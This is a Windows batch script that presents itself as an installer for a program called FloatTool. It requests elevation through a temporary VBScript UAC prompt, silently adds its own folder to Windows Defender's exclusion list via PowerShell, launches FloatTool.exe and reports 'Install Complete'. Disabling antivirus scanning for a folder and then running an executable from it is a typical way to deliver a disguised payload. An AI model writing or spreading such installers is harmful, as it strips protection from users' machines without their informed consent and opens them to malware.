@echo off

NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' (
    goto :runAsAdmin
) else (
    echo Requesting administrative permissions...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\Admin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\Admin.vbs"
    "%temp%\Admin.vbs"
    del "%temp%\Admin.vbs"
    exit /B
)

:runAsAdmin

set "batch_dir=%~dp0"

powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%batch_dir%'}"

start "" "%batch_dir%FloatTool.exe"

echo Install Complete
pause
